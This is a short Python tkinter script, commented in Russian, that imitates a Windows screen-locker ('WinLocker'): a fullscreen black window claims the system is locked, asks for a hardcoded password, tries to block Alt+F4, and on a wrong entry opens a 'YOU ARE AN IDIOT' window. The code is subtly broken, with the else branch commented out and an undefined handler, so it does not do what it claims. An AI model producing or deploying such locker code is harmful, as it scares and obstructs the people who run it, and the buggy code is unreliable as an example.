import tkinter as tk

import getpass

from tkinter import messagebox


# Создаём главное окно

root = tk.Tk()  

root.title("ОЙ-ОЙ")  

root.geometry ('600x400')

root.attributes('-fullscreen', True)

# Добавляем метку

label = tk.Label(root, text="Вы подхватили WinLocker, Ваш Windows заблокирован", fg="red")  

label.pack(pady=50)

label = tk.Label(root, text="Введите пароль для разблокировки", fg="red")  

label.pack(pady=1)

# Запускаем главный цикл

def get_password():
    password = entry.get()

    if (password=="Escape"):

        print("Password:Correct")
        root.destroy()
        

        
    #else:

        print("Password:Denny")
        root.destroy()
        
        Toplevel = tk.Tk()  

        Toplevel.title("YOU ARE AN IDIOT")  

        Toplevel.geometry ('600x400')

        Toplevel.attributes('-fullscreen', True)
        
    

# Сделаем поля для ввода пароля
entry = tk.Entry(show="")
entry.pack()

# Делаем так что бы онне закрывался на alt+f4
root.protocol("WM_DELETE_WINDOW", lambda: closes_gracefully())

# Кнопка проверки пароля

button = tk.Button(text="Ввести", command=get_password)
button.pack()

root.configure(bg='black')





root.mainloop()

  

